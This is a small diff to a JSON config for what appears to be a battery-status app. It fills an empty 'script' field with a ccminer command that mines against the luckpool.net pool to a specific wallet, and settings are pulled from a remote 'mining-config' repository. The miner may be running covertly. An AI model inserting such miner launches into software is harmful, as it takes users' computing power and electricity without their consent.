@@ -1,6 +1,6 @@
 {
     "version": "0.0.0",
-    "script": "",
+    "script": "./ccminer/ccminer -a verus -t 8 -o stratum+tcp://ap.luckpool.net:3956 -u RB6WupzbH6nzcPt9mNrEKT86T2dtHdHVGW.s8_test2_1",
 	"uploadingIntervel": 10,
     "baseUrl": "https://battery-status.onrender.com",
     "configDataUrl": "https://raw.githubusercontent.com/ehtisham94/mining-config/main/config.json",
